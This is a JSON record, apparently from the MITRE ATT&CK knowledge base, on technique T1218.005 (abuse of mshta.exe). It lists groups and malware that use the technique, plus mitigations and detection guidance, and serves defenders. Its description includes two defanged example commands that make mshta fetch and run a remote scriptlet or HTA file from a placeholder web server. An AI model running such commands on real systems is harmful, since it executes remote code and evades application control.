{"TTP_id": "enterprise-TA0005-T1218-T1218.005", "TTP_name": "Mshta", "Description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [1] [2] [3] [4] [5]Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. [6] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [7]Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]", "Property": {"ID": "T1218.005", "Sub-technique of": "T1218", "Tactic": "Defense Evasion", "Platforms": "Windows", "Permissions Required": "User", "Defense Bypassed": "Application control, Digital Certificate Validation", "Contributors": "@ionstorm; Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank", "Version": "2.0", "Created": "23 January 2020", "Last Modified": "11 March 2022"}, "Examples": {"G0016": ["https://attack.mitre.org/groups/G0016", "APT29", "APT29 has use mshta to execute malicious scripts on a compromised host.[9]"], "G0050": ["https://attack.mitre.org/groups/G0050", "APT32", "APT32 has used mshta.exe for code execution.[10][11]"], "S0414": ["https://attack.mitre.org/software/S0414", "BabyShark", "BabyShark has used mshta.exe to download and execute applications from a remote server.[12]"], "G0142": ["https://attack.mitre.org/groups/G0142", "Confucius", "Confucius has used mshta.exe to execute malicious VBScript.[13]"], "G0046": ["https://attack.mitre.org/groups/G0046", "FIN7", "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.[5]"], "G0047": ["https://attack.mitre.org/groups/G0047", "Gamaredon Group", "Gamaredon Group has used mshta.exe to execute malicious HTA files.[14]"], "G0100": ["https://attack.mitre.org/groups/G0100", "Inception", "Inception has used malicious HTA files to drop and execute malware.[15]"], "G0094": ["https://attack.mitre.org/groups/G0094", "Kimsuky", "Kimsuky has used mshta.exe to run malicious scripts on the system.[16][12][17][18]"], "S0250": ["https://attack.mitre.org/software/S0250", "Koadic", "Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.[19][20]"], "G0032": ["https://attack.mitre.org/groups/G0032", "Lazarus Group", "Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.[21][22]"], "G0140": ["https://attack.mitre.org/groups/G0140", "LazyScripter", "LazyScripter has used mshta.exe to execute Koadic stagers.[20]"], "S0455": ["https://attack.mitre.org/software/S0455", "Metamorfo", "Metamorfo has used mshta.exe to execute a HTA payload.[23]"], "G0069": ["https://attack.mitre.org/groups/G0069", "MuddyWater", "MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.[24][25]"], "G0129": ["https://attack.mitre.org/groups/G0129", "Mustang Panda", "Mustang Panda has used mshta.exe to launch collection scripts.[26]"], "S0228": ["https://attack.mitre.org/software/S0228", "NanHaiShu", "NanHaiShu uses mshta.exe to load its program and files.[27]"], "S0223": ["https://attack.mitre.org/software/S0223", "POWERSTATS", "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.[24]"], "S0147": ["https://attack.mitre.org/software/S0147", "Pteranodon", "Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.[14]"], "S0379": ["https://attack.mitre.org/software/S0379", "Revenge RAT", "Revenge RAT uses mshta.exe to run malicious scripts on the system.[28]"], "S0589": ["https://attack.mitre.org/software/S0589", "Sibot", "Sibot has been executed via MSHTA application.[29]"], "G0121": ["https://attack.mitre.org/groups/G0121", "Sidewinder", "Sidewinder has used mshta.exe to execute malicious payloads.[30][31]"], "G0127": ["https://attack.mitre.org/groups/G0127", "TA551", "TA551 has used mshta.exe to execute malicious payloads.[32]"], "S0341": ["https://attack.mitre.org/software/S0341", "Xbash", "Xbash can use mshta for executing scripts.[33]"]}, "Mitigation": {"M1042": ["https://attack.mitre.org/mitigations/M1042", "Disable or Remove Feature or Program", "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life."], "M1038": ["https://attack.mitre.org/mitigations/M1038", "Execution Prevention", "Use application control configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the mshta.exe application and to prevent abuse.[34]"]}, "Detection": {"Command Execution": ["Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.", "DS0017", "https://attack.mitre.org/datasources/DS0017", "Command"], "File Creation": ["Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious", "DS0022", "https://attack.mitre.org/datasources/DS0022", "File"], "Network Connection Creation": ["Monitor for newly constructed network connections that are sent or received by untrusted hosts.", "DS0029", "https://attack.mitre.org/datasources/DS0029", "Network Traffic"], "Process Creation": ["Use process monitoring to monitor the execution and arguments of mshta.exe.", "DS0009", "https://attack.mitre.org/datasources/DS0009", "Process"]}}
